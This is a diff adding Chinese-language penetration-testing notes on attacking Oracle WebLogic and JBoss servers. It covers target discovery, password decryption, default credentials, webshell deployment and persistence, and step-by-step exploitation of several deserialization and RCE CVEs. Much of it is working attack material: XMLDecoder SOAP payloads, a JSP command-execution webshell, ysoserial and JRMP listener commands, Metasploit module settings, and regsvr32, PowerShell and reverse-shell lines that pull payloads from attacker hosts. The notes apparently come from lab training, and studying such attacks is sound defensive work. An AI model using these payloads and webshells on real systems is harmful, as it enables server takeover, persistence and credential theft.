@@ -328,14 +328,831 @@ python2 Tomcat-ROOT路径下文件包含(CVE-2020-1938).py -p 8009 -f shellz.txt
 
 
 
-
-
-
-
-
-
 注：
 shell.jsp%20 是利用windows自动去处空格结尾的特性
 shell.jsp::$DATA 是利用NTFS流
 shell.jsp.	在windows中会自动去掉.
 shell.jsp/  是利用linux或windows中不允许文件名带有/，故会自动取消
+
+
+
+
+shiro和weblogic总结。 重点。
+
+
+weblogic：java应用服务器软件。
+默认端口：7001
+若没时间扫全端口，则常扫60000后的。
+
+
+weblogic环境配置：oracle+weblogic10.3.6.0
+安装和配置weblogic：
+java -jar weblogcz.jar	安装。
+-->典型安装->建议选择jdk-7u的版本 如：C:\Program Files\Java\jdk1.7.0_21-->默认即可，安装成功。
+点击Getting start-->域名和位置默认(若实际情况则自定义即可)->输入口令：Q123456we
+-->选择生产模式->选中管理服务器、受管服务器->Listener address如选：192.168.88.134  本机ip-->端口默认7001->默认下一步->
+它会创建一个域->创建成功。
+启动：
+默认安装在C:\Oracle\Middleware\	
+C:\Oracle\Middleware\user_projects\domains\base_domain\startWebLogic.cmd 启动即可。	关闭weblogic：关闭cmd窗口即可。
+base_domain为域名。
+输入账号/密码：
+weblogic/Q123456we
+访问：http://192.168.88.134:7001/console/login/LoginForm.jsp	登录即可。
+配置：
+点击锁定并编辑->左边Services->data sources[数据源主要用于调用数据库]-->new 新建一个data source-->name：test   JNDI_name:sbianxietest
+-->oracle 下一步->填写数据：
+数据库名：orcl		#默认的
+主机名：192.168.88.134	#其主机ip
+端口：1521		#oracle数据库默认连接端口
+账户名：system
+密码：Q123456we
+连接成功。
+-->下一步，点击数据源名字(qwe)->进入->save 激活更改
+
+oracle中服务名和SID的区别：
+服务名类似一个数据库。但该数据库可以有多个实例(SID).
+
+
+
+
+收集weblogic资产：
+1.nmap扫描端口，获取服务信息：
+nmap -n -sT -Pn --open -v -p -sV 7001 192.168.43.6
+其中-n指：直接显示ip地址以及端口，不解析为服务名或者主机名
+2.google语法：
+inurl:/console/login/LoginForm.jsp intitle:Oracle Weblogic Server
+inurl:/console/login/ intitle:"Oracle Weblogic Server 管理控制台"
+3.空间搜索引擎：
+app="BEA-WebLogic-Server" && port="7001"
+
+渗透测试新趋势：非常依赖fofa.
+
+
+破解weblogic数据源密码：相当于对应的oracle数据库的密码。
+1.打开C:\Oracle\Middleware\user_projects\domains\base_domain\config\jdbc\*-jbdc.xml文件(如：qwe-jbdc.xml)，提取其中password-encrypted的值。
+2.查看SerializedSystemIni.dat路径：
+一般路径：C:\Oracle\Middleware\user_projects\domains\base_domain\security
+版本不同，存在差异。
+3.使用解密工具weblogic.jar解密。
+
+eg1：
+拿到：
+<password-encrypted>{AES}zznK5V60hAZrl8JPm5zjj+chheev+VASlK49ZaBm318=</password-encrypted>
+使用K8工具解密。
+Path：对应的SerializedSystemIni.dat文件
+Pass：{AES}zznK5V60hAZrl8JPm5zjj+chheev+VASlK49ZaBm318=
+解密成功。
+
+
+
+weblogic开发模式下启动不需输入用户名和密码，但在生产模式下需要。
+配置weblogic在生产模式下自动输入用户名和密码：
+如：weblogic10.3.6.0配置在生产模式下自动输入用户名和密码：
+在域的/security目录下创建文件boot.properties文件：内容未：
+----------1s---------
+username=weblogic
+password=weblogic123
+------------1e----------
+输入自己的密码即可。
+注：若没有security文件夹，则自己新建一个即可，再新建boot.properties文件，添加内容。
+我的路径为：
+C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\security\boot.properties
+配置好后重启weblogic即可。
+
+windows启动weblogic：
+运行C:\Oracle\Middleware\user_projects\domains\base_domain\startWebLogic.cmd文件。  对应目录。
+关闭weblogic：关闭该cmd窗口即可。
+
+
+boot.properties文件第一次添加明文，weblogic启动后会自动加密，再次打开该文件则为密文，如：
+password={AES}gbkpZowvogO97Bg+BwOrVZrSN6C1hr9Q55ND7ClMhSg\=
+username={AES}qST6CC8hTKvyA+40+A8EvCB8becohgjqc/+YqHqizCg\=
+该文件的作用主要是用于weblogic启动时自动填写其中凭证。
+
+weblogic登录界面一般都有防暴机制(5次). 故尝试一下默认的口令就行了。
+
+
+注：weblogic11g密码类似：password={AES}gbkpZowvogO97Bg+BwOrVZrSN6C1hr9Q55ND7ClMhSg\=
+破解时，需将后面的\去掉，否则执行出错。
+
+破解步骤与前面类似：
+java -jar .\K8weblogic.jar
+Path：选择读取的SerializedSystemIni.dat文件
+pass：{AES}gbkpZowvogO97Bg+BwOrVZrSN6C1hr9Q55ND7ClMhSg=		注：需去掉\
+可能需多点几次。
+
+
+破解weblogci控制台登录密码：如上面所示。
+
+
+
+
+weblogic部署getshell：
+适用版本：weblogic 10.x-12.x
+weblogic10g-12c默认的管理后台类似为：http://192.168.43.6:7001/console
+注：需提前备好war包。与原来的war包类似。
+
+默认弱口令：
+http://cirt.net/passwords?criteria=weblogic
+
+常见弱口令：
+system/password
+weblogic/weblogic
+admin/security
+joe/password
+ 
+weblogic的配置文件：如：
+C:\Oracle\Middleware\user_projects\domains\base_domain\config\config.xml
+--------------1s------------
+<server>
+    <name>AdminServer</name>
+    <listen-address>192.168.43.18</listen-address>
+  </server>
+-------------1e-------------
+配置weblogic监听的ip地址。
+
+
+生成war包：
+jar -cvf .\wkz.war  .\Leo.jsp
+
+
+getshell步骤：
+1.登录weblogic后台。
+2.开启锁定并编辑-->部署-->安装-->上传war包[将部署上载到管理服务器](实际中，要尽可能免杀)-->将其安装为应用程序->
+name自定义(如：testz)->完成->save 激活更改。
+部署->找到testz->为所有请求提供服务 启动。保存。
+eg1：上传wkz.war 当然，需为jsp的马.
+
+
+部署的war包一般是在临时目录下存储的，如：在tmp等目录下，重启后里面内容会被清空。
+访问：
+http://192.168.43.18:7001/w8/xiaolian.jsp
+如：
+http://192.168.43.18:7001/w8/xiaolian.jsp?pwd=023&cmd=whoami
+成功回显。
+
+
+维权(巩固政权)：
+上传路径：如：将木马再上传到如下等目录下。
+C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\
+再访问维权shell：
+http://192.168.43.18:7001/console/framework/skins/wlsconsole/images/q.jsp
+若上传不成功，则可能是权限的问题。
+连接成功。
+
+
+weblogic反序列化漏洞：
+序列化：将对象转为二进制格式数据存储。对应writeObject方法。
+反序列化：将二进制格式数据转为对象。对应readObject方法。
+
+RMI和JMX：
+序列化和反序列化，能使得java对象脱离java运行环境，以持久化存储。
+反序列化使用场景：多平台之间的通信、管理等。
+RMI：java的一组关于开发分布式应用程序的API，实现不同OS之间程序的方法调用。
+注：RMI传输，百分百基于反序列化。java RMI的默认端口为1099.
+
+JMX：是一套标准的代理和服务。用户可在任何java应用程序中使用这些代理和服务来实现管理、监控等。
+注：weblogic管理页面是基于JMX开发的，JBoss整个系统都基于JMX架构。
+
+
+漏洞1：cve-2014-4210
+weblogic ssrf.
+
+影响范围：weblogic
+10.0.2.0和10.3.6.0
+
+原理：这几个版本中的weblogic Server组件中允许远程攻击者通过与WLS-Web服务相关的向量影响机密性。
+(非人话。) 漏洞点在于该文件的一个参数operator
+成功率不高，比较局限。
+位置：
+http://192.168.43.18:7001/uddiexplorer/SearchPublicRegistries.jsp
+
+weblogic ssrf服务探测：主要用于探测内网服务和端口。
+1.请求未开放的服务或端口：
+关键字符串：Tried all: '1' address,but could not connect over HTTP to server.
+2.请求开放的服务：
+Received a response from url...或
+returned a 404 error code
+
+3.可被识别的回显：
+Received a response from url...  SOAP content-type:text/html; charset=UTF-8
+4.不可被识别的回显：
+Received a response from url...SOAP content-type: null
+
+
+
+利用：
+通过如下的url去访问：
+http://192.168.43.18:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001
+核心：根据返回的数据不同来判断是否开放。
+
+cve-2017-10271漏洞：主要就是xml触发点。
+原理：weblogic WLS组件中存在rce.
+受影响版本：10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, 12.2.1.2.0
+利用步骤：
+1.访问http://192.168.43.18:7001/wls-wsat/CoordinatorPortType抓取数据包。
+2.修改数据包，改为POST方式，修改Content-Type: text/xml
+将Cache-Control修改为no-cache
+然后body放paylaod 如：弹出计算器。
+注：命令执行以空格分隔，每一部分占一个数组元素。 数组长度必须和实际匹配。
+如：
+cmd /c calc			#数组长度为3
+
+payload：
+[cmd, /c, powershell, -nop]
+弹出计算器payload
+------------------1s-------------------
+<soapenv:Envelope     xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+    <soapenv:Header>
+       <work:WorkContext    xmlns:work="http://bea.com/2004/06/soap/workarea/">
+           <java      version="1.8" class="java.beans.XMLDecoder">
+               <void     class="java.lang.ProcessBuilder">
+                    <array    class="java.lang.String" length="3">
+                        <void     index="0">
+                           <string>calc</string>
+                        </void>
+                        <void     index="1">
+                            <string></string>
+                        </void>
+                        <void     index="2">
+                            <string> </string>
+                        </void>
+                    </array>
+                <void     method="start"/></void>
+           </java>
+       </work:WorkContext>
+   </soapenv:Header>
+    <soapenv:Body/>
+    </soapenv:Envelope>
+--------------------1e-----------------------
+成功触发。
+
+若想msf上线，则payload类似：
+如想执行：
+regsvr32 /s /n /u /i:http://192.168.43.103:8080/JH2tLY.sct scrobj.dll
+--------------2s-----------
+<soapenv:Envelope     xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+    <soapenv:Header>
+       <work:WorkContext    xmlns:work="http://bea.com/2004/06/soap/workarea/">
+           <java      version="1.8" class="java.beans.XMLDecoder">
+               <void     class="java.lang.ProcessBuilder">
+                    <array    class="java.lang.String" length="3">
+                        <void     index="0">
+                           <string>cmd</string>
+                        </void>
+                        <void     index="1">
+                            <string>/c</string>
+                        </void>
+                        <void     index="2">
+                            <string>regsvr32 /s /n /u /i:http://192.168.43.103:8080/JH2tLY.sct scrobj.dll</string>
+                        </void>
+                    </array>
+                <void     method="start"/></void>
+           </java>
+       </work:WorkContext>
+   </soapenv:Header>
+    <soapenv:Body/>
+    </soapenv:Envelope>
+----------------2e--------
+成功上线。
+
+利用方式三：
+body存放paylaod，写shell.
+注：CDATA内 存放webshell代码。
+如：
+----------1s------------------
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+        <java><java version="1.4.0" class="java.beans.XMLDecoder">
+            <object class="java.io.PrintWriter">
+                <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</string><void method="println">
+                    <string><![CDATA[<%
+    if("ty".equals(request.getParameter("pwd"))){
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
+        int a = -1;          
+        byte[] b = new byte[102400];          
+        out.print("<pre>");          
+        while((a=in.read(b))!=-1){
+            out.println(new String(b));          
+        }
+        out.print("</pre>");
+    } 
+    out.print("test"); 
+    %>]]></string></void><void method="close"/>
+            </object>
+        </java>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+<soapenv:Body/>
+</soapenv:Envelope>
+---------------------1e---------------
+其中servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp为写入路径。
+写入成功。写入到：
+C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\a.jsp
+访问：
+http://192.168.43.18:7001/bea_wls_internal/a.jsp
+即可。
+执行：
+http://192.168.43.18:7001/bea_wls_internal/a.jsp?pwd=ty&cmd=ipconfig /all
+
+
+cve-2018-2628
+原理：weblogic server组件的子组件WLS核心组件的漏洞。
+漏洞影响
+Weblogic 10.3.6.0
+Weblogic 12.1.3.0
+Weblogic 12.2.1.2
+Weblogic 12.2.1.3
+
+攻击者通过T3协议进行网络访问，造成RCE.
+RMI：远程方法调用。能让在某个java虚拟机上的对象像调用本地对象引用调用另一个java虚拟机上的对象的方法。
+T3协议：即RMI在weblogic server和其他java 程序(包括客户端以及其他weblogic server实例)间传输数据使用的协议。
+
+
+
+
+
+漏洞利用：
+1.检测目标是否使用T3协议：
+nmap -n -v -p 7001,7002 --script=weblogic-t3-info 192.168.43.18
+2.检测目标是否存在漏洞：
+python脚本。
+
+weblogic若启动失败，则检查weblogic配置文件监听地址是否有问题。
+
+
+cve-2018-2628：生成反序列化等paylaod时，尽可能jdk不要太高。 一般jdk1.8
+利用：参考https://github.com/tdy218/ysoserial-cve-2018-2628
+最好在linux下进行利用。
+1.下载ysoserial，并启动JRMP Server
+java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
+如：
+java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 'regsvr32 /s /n /u /i:http://192.168.43.6:8080/sadwfdsf.dll'
+或：
+java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 'calc'
+即在1099端口监听，当对方java对象访问该端口时，就把paylaod发往目标机器。 端口可自定义.
+
+2.发送paylaod到目标机器执行：
+python q2exploit.py 目标站点ip weblogic端口 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 监听JRMP服务的机器ip 1099 JRMPClient
+如：
+python q2exploit.py 192.168.43.18 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.43.113 1099 JRMPClient
+
+核心：靶机weblogic组件建立到远程机器的tcp连接读取了序列化数据，再在本地readObject解析，故造成反序列化远程代码执行。
+
+JMRP协议：指一个对象的java到java的远程调用。
+
+
+
+
+cve-2018-2893：
+原理：绕过cve-2018-2628补丁。
+漏洞影响
+Weblogic 10.3.6.0
+Weblogic 12.1.3.0
+Weblogic 12.2.1.2
+Weblogic 12.2.1.3
+
+注:jdk<=JDK7u21可利用。
+最好在linux.
+
+利用：
+1.检测漏洞：python脚本。
+如：python q1CVE-2018-2893.py 192.168.43.18 7001 
+2.反弹msf会话：
+java -jar ysoserial-cve-2018-2893.jar JRMPClient4 "攻击者ip:1099" > yi.cer
+java -cp ysoserial-cve-2018-2893.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 "msf命令"
+python weblogic.py 192.168.43.18 7001 yi.cer	#远程执行paylaod
+如：
+java -jar ysoserial-cve-2018-2893.jar JRMPClient4 "192.168.43.113:30668" > sbsbxzq.cer
+生成payload到本地，里面包含靶机要反连的地址。   核心：将反连地址告诉靶机，但还没发。
+
+java -cp ysoserial-cve-2018-2893.jar ysoserial.exploit.JRMPListener 30668 Jdk7u21 "regsvr32 /s /n /u /i:http://192.168.43.113:8080/EOPnr2svL.sct scrobj.dll"
+
+python q3weblogic.py 192.168.43.18 7001 sbsbxzq.cer
+将生成的payload，发往靶机，靶机再远程连接攻击者的监听地址，获取反序列化paylaod再序列化执行。
+
+
+eg1：
+-------------------------1s---------------------------------
+java -jar ysoserial-cve-2018-2893.jar JRMPClient4 "192.168.43.103:30146" > sbsbxw2zq.cer
+
+regsvr32 /s /n /u /i:http://192.168.43.103:8080/l5Lt5e.sct scrobj.dll
+# 3563
+
+java -cp ysoserial-cve-2018-2893.jar ysoserial.exploit.JRMPListener 30146 Jdk7u21 "regsvr32 /s /n /u /i:http://192.168.43.103:8080/l5Lt5e.sct scrobj.dll"
+
+python q3weblogic.py 192.168.43.18 7001 sbsbxw2zq.cer
+---------------------------1e-----------------------------
+
+
+
+
+注：若对方为win，则windows/meterpreter/reverse_tcp  或x64
+获得shell后最好赶紧关闭java监听的程序，不然会一直发。
+该漏洞利用一般对靶机的jdk版本有要求。不能太高。
+
+
+
+
+
+cve-2020-14882，cve-2020-14883：
+weblogic是oracle的J2EE应用服务器。
+cve-2020-14882：允许未授权的用户绕过管理控制台的权限验证访问后台。
+cve-2020-14883：允许后台任意用户通过http协议执行任意命令。 
+使用这两个漏洞构成利用链，可通过一个GET请求在远程weblogic服务器上以未授权的任意用户身份执行命令。
+影响范围：
+weblogic 10.3.6.0.0
+weblogic 12.1.3.0.0
+weblogic 12.2.1.3.0
+weblogic 12.2.1.4.0
+weblogic 14.1.1.0.0
+
+https://github.com/jas502n/CVE-2020-14882
+
+
+
+未登录直接访问：
+http://192.168.43.18:7001/console/css/%252e%252e%252fconsole.portal
+即可。多访问几次。
+
+参考：https://github.com/GGyao
+
+
+
+利用步骤：
+1.生成pocz.xml
+内容类似：
+------------------1s---------------
+<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg>
+      <list>
+        <value>cmd</value>
+        <value>/c</value>
+        <value><![CDATA[calc]]></value>
+      </list>
+    </constructor-arg>
+  </bean>
+</beans>
+-------------------1e---------------
+2.burp抓包 http://192.168.43.18:7001/console/css/%252e%252e%252fconsole.portal 数据。
+3.
+a.修改为POST
+b.post的数据类似为：
+-------------------2s-------------
+_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://192.168.43.103:8109/poczw.xml")
+---------------------2e-----------
+其中http://192.168.43.103:8109/poczw.xml为构造的web服务器上的文件。被靶机下载触发。
+
+c.使用python3快速搭建web服务器：
+python3 -m http.server 8006		#指定8006端口。默认在8000端口。
+
+
+访问 http://127.0.0.1:8006/ 查看类似www目录下的文件。实则是以执行(python3 -m http.server 8006)时所在的目录为网站根目录。
+
+eg2：
+-----------------------1s--------------
+POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
+Host: 192.168.43.18:7001
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: ADMINCONSOLESESSION=tDy4h8yLdKTGdGMb9yvx48mJy2S0ccwqCcfFX1qDvpkyWBJgTGyw!1901698480
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 165
+
+_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://192.168.43.103:8109/poczw.xml")
+-------------------------1e-------------
+返回302，成功触发。
+msf等上线同理，触发成功。
+
+
+拿到权限首先考虑维权，再考虑提权。
+
+
+
+
+jboss安全：
+Jboss是一个基于J2EE的开源应用服务器。但JBoss核心服务不包括支持servlet/JSP的web容器。
+一般与Tomcat或Jetty绑定使用。
+后面改名未WildFly.
+
+jboss环境配置：
+1. 此例使用jdk1.7和jboss4.2.3
+下载：
+https://jbossas.jboss.org/downloads
+选择4.2.3-->jboss-4.2.3.GA.zip下载即可。
+
+
+2. 设置JBOSS_HOME环境变量(非Path)，值为jboss安装路径
+如：
+JBOSS_HOME
+C:\jboss-4.2.3.GA
+
+3.修改配置文件，如：
+C:\jboss-4.2.3.GA\server\default\deploy\jboss-web.deployer\server.xml
+使其监听来自任意地址 0.0.0.0
+将22行左右的 <Connector port="8080" address="${jboss.bind.address}"  修改为：
+<Connector port="8080" address="0.0.0.0"  
+若是jboss6.0.0配置，则：
+HTTP/1.1那行和AJP/1.3那行监听的地址都改为 0.0.0.0
+
+
+
+启动jboss：
+jboss4.2.3\bin\run.bat
+
+
+jboss默认端口：8080
+
+访问：
+http://192.168.43.18:8080
+
+
+
+
+判断指纹方式：
+核心：根据其特定的特征。图标、路径、请求headers、参数等。
+如：将logo生成md5值，匹配。
+
+
+收集jboss信息：
+1.探测端口和服务： 其实更常用fscan.
+nmap -sT -sV --open -p 80,8080-8090,9990,9999 -v -n 192.168.43.6-36
+2.查看响应头信息。
+X-Powered-By: Servlet 2.4; JBoss-4.2.3.GA (build: SVNTag=JBoss_4_2_3_GA date=200807181417)/JBossWeb-2.0
+3.利用搜索引擎：
+jboss默认控制台路径：
+/jmx-console
+/web-console
+/web-console/Invoker
+/invoker/JMXInvokerServlet
+
+inurl:/console intitle:"JBoss Management"
+inurl:/jmx-console/ site:*.baidu.*
+inurl:/admin-console/ site:*.target.*
+intitle:"Welcome to JBoss" site:*.target.*
+
+插件：Wappalyzer
+Set Character Encoding
+4.使用空间搜索引擎：
+"x-powered-by" "jboss"
+jboss http.favicon.hash:-656811182
+
+什么是host碰撞：
+即某些站点或服务必须带有某些特定的ip或域名才能访问，则通过字典暴破的方式根据响应差异来进行碰撞。
+
+
+jboss4.2.3部署临时性webshell：
+1.常规手工部署webshell：
+a.在web服务器上部署war包(jar -cvf testz.war qz.jsp)
+b.访问对应的http://192.168.43.18:8080/jmx-console/ -> jboss.deployment -> DeploymentScanner->
+Java.net.URL类型addURL()，利用该函数部署war包。
+在void addURL()的ParamValue填值类似为：
+http://192.168.43.103:8136/Lez.war
+点击invoke-->进入Back to MBean View-->Apply change.
+
+
+此函数主要是通过访问我们的vps的站点来获取war包，进而部署。
+
+c.若webshell没能直接访问，则一般是没能成功部署war包。故：点击DeploymentScanner页面点击下属性列表中的"Apply change"
+访问：
+http://192.168.43.18:8080/Lez/Leo.jsp?o=vLogina
+成功获取shell.
+默认也是在tmp下，故需考虑维权。
+
+
+d.维权webshelll：
+C:\jboss-4.2.3\server\default\deploy\jmx-console.war
+http://192.168.43.18:8080/jmx-console/cat.jsp
+eg1：
+将zwz.jsp马放在C:/jboss-4.2.3.GA/server/default/deploy/jmx-console.war/下。
+访问：
+http://192.168.43.18:8080/jmx-console/behinder_shell.jsp
+成功连接。
+
+
+
+方式二：
+直接利用msf的各种jboss利用模块：
+通过JMXInvokerServlet接口来部署webshell：
+msf > use exploit/multi/http/jboss_invoke_deploy	#使用jboss模块
+msf > set rhosts 192.168.43.18 		#设置目标ip地址
+msf > set rport 8080 		#若改了端口，则灵活变化。 目标端口
+msf > set targeturi /invoker/JMXInvokerServlet 	#设置目标相关组件、路径什么的。
+msf > set target 1 			#设置自动选择架构。
+msf > set payload java/meterpreter/reverse_http 	#设置msf架设的web服务器伪造为https
+msf > set lport 80  		#设置msf的web服务器对应的访问端口为80  可自定义
+msf > exploit
+
+
+
+stager和stagers是先锋、小模块; 
+stages和stage是大模块、完整payload.
+
+
+方式三：
+msf > use exploit/multi/http/jboss_deploymentfilerepository
+msf > set rhosts 192.168.43.18
+msf > set rport 8080
+msf > set targeturi /jmx-console 
+msf > set verb POST
+msf > set target 3 			#选择为java平台
+msf > set payload java/meterpreter/reverse_http 	#设置msf架设的web服务器伪造为https
+msf > set lport 80  		#设置msf的web服务器对应的访问端口为80  可自定义
+msf > exploit
+成功获取会话。
+
+
+方式四：
+msf > use exploit/multi/http/jboss_bshdeployer
+msf > set rhosts 192.168.43.18
+msf > set rport 8080
+msf > set verb POST 	#也可指定不同的请求方法，来规避某些错误
+msf > set target 3 			#选择为java平台
+msf > set payload java/meterpreter/reverse_http 	#设置msf架设的web服务器伪造为https
+msf > set lport 80  		#设置msf的web服务器对应的访问端口为80  可自定义
+msf > exploit
+成功获取会话。
+
+
+方式五：
+https://github.com/joaomatosf/jexboss
+这个一般使用nc先监听，在考虑反弹shell到msf等。
+
+
+
+
+
+
+cve-2017-7504:
+在jboss4.x及其之前版本中，JbossMQ实现过程中的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞。造成rce.
+
+
+环境：
+jboss4.2.3
+
+利用：
+1.验证目标jboss是否存在该漏洞：
+访问：http://192.168.43.18:8080/jbossmq-httpil/HTTPServerILServlet/
+若返回如下内容，则可能存在此漏洞。
+This is the JBossMQ HTTP-IL
+
+
+2.借助JavaDeserH2HC工具利用此漏洞，反弹shell.
+参考：https://github.com/joaomatosf/JavaDeserH2HC
+
+eg1:jboss<=4.x
+(1). cd javaDeserH2Hc/
+
+#编译java文件。
+(2). /root/Desktop/asdwz/w1/jexboss-master/zwzz/jdk1.7.0_21/bin/javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
+生成了ReverseShellCommonsCollectionsHashMap.class文件。
+
+(3). /root/Desktop/asdwz/w1/jexboss-master/zwzz/jdk1.7.0_21/bin/java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 192.168.43.103:2336 
+生成包含反连地址的cer文件。如：ReverseShellCommonsCollectionsHashMap.ser
+
+(4). 开启监听：
+nc -lvp 2336
+
+(5). curl http://192.168.43.18:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
+发送payload，使其执行。
+成功获取session，然后使用nc获得msf等会话。
+
+
+注：该工具对jdk有要求。
+http://www.joaomatosf.com/rnp/?prefix=rnp/java_files/
+下载jdk-7u21-linux-x64.tar.gz
+
+eg2:使用ysoserial.jar
+java -jar ysoserial.jar CommonsCollections6 "calc.exe" > poct6.ser
+curl http://192.168.43.18:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @poct6.ser
+其中命令可以换成msf、cs上线登门命令，若和双引号冲突直接\转义即可。
+成功上线。
+
+
+
+
+
+
+
+
+爆破jboss6.x账号密码：
+jboss6.x 默认后台路径：admin-console
+即或：
+http://192.168.43.18:8080/admin-console
+http://192.168.43.18:8080/admin-console/login.seam?conversationId=4
+默认账号密码：admin/admin
+
+默认jboss6.x以后的admin-console登录账号密码存放在类似：
+C:\Users\Administrator\Desktop\jboss-as-distribution-6.1.0.Final\jboss-6.1.0.Final\server\default\conf\props\jmx-console-users.properties
+文件中。
+
+配置环境：
+和前面类似。
+2. 设置JBOSS_HOME环境变量(非Path)，值为jboss安装路径
+如：
+JBOSS_HOME
+C:\Users\Administrator\Desktop\jboss-as-distribution-6.1.0.Final\jboss-6.1.0.Final
+
+3.修改配置文件，如：
+C:\Users\Administrator\Desktop\jboss-as-distribution-6.1.0.Final\jboss-6.1.0.Final\server\default\deploy\jbossweb.sar\server.xml
+使其监听来自任意地址 0.0.0.0
+将22行左右的 <Connector port="8080" address="${jboss.bind.address}"  修改为：
+<Connector port="8080" address="0.0.0.0"  
+若是jboss6.0.0配置，则：
+HTTP/1.1那行和AJP/1.3那行监听的地址都改为 0.0.0.0
+
+
+启动jboss：
+jbossz\bin\run.bat
+
+
+登录.
+
+直接上传war包部署，再访问http://192.168.43.18:8080/cmdz/cmd.jsp即可。
+后续可手动上传其他jsp马到类似：
+C:\Users\Administrator\Desktop\jboss-as-distribution-6.1.0.Final\jboss-6.1.0.Final\server\default\deploy\ROOT.war\ 目录下
+替换完，回到控制台，delete前面的war包即可。
+
+
+登录后->点击左边的web application WAR-->add new resource->选择teszwz.war包上传，注：需选择为所有文件-->
+continue->访问：
+http://192.168.43.18:8080/teszwz/pwz.jsp?o=vLogin
+也是在tmp下。
+
+
+
+jbossAS 5.x/6.x 反序列化rec(CVE-2017-12149)
+原理：在JBossApplicationServer中，发现HTTP调用程序的ReadOnlyAccessFilter中的doFilter方法不限制其执行反序列化的类，故造成rce.
+
+影响范围：
+jbossAS 5.x/6.x
+
+
+环境配置：
+如：jboss-6.0.0Fianl
+
+
+利用：
+1.明确版本信息：通过请求、响应、信息收集、指纹等识别。
+如：curl -I http://192.168.43.18:8080
+2.明确是否存在该漏洞：
+访问：http://192.168.43.18:8080/invoker/readonly 
+若报500错误，则目标很可能存在该漏洞。
+3.生成paylaod反弹shell： 一般使用jdk1.8
+参考：https://github.com/joaomatosf/JavaDeserH2HC
+
+(1). cd javaDeserH2Hc/
+#编译java文件。
+(2). /root/Desktop/asdwz/w1/jexboss-master/zwzz/jdk1.7.0_21/bin/javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
+生成了ReverseShellCommonsCollectionsHashMap.class文件。
+(3). /root/Desktop/asdwz/w1/jexboss-master/zwzz/jdk1.7.0_21/bin/java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 192.168.43.103:2336 
+生成包含反连地址的cer文件。如：ReverseShellCommonsCollectionsHashMap.ser
+(4). 开启监听：
+nc -lvp 2336
+(5). curl http://192.168.43.18:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
+发送payload，使其执行。
+成功获取session，然后使用nc获得msf等会话。
+
+注：该工具对jdk有要求。
+http://www.joaomatosf.com/rnp/?prefix=rnp/java_files/
+下载jdk-7u21-linux-x64.tar.gz
+
+反弹shell比较通用。
+
+msf上线也可使用payload：
+set payload windows/x64/meterpreter/reverse_tcp_rc4
+其中rc4表示加密。
+
+
+
+方式二：注：若使用ysoserial.jar，则一般使用CommonsCollections6这个模块，成功率更高。 这个需要根据环境不同灵活变换。
+1. msf生成paylaod命令。
+2. java -jar ysoserial.jar CommonsCollections6 "calc" > testz.ser
+生成反序列化payload.
+
+3. 发送payload：
+curl http://192.168.43.18:8080/invoker/readonly --data-binary @testz.ser
+
+若cs上线，则：
+cs生成payload：
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.43.42:8016/dfgefz'))"
+可能需要转义：因为双引号。
+java -jar ysoserial.jar CommonsCollections6 "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.43.42:8016/dfgefz'))\"" > poct1.ser
+
+curl http://192.168.43.18:8080/invoker/readonly --data-binary @poc1.ser
+
+成功上线。
+
+
+
+
+
+
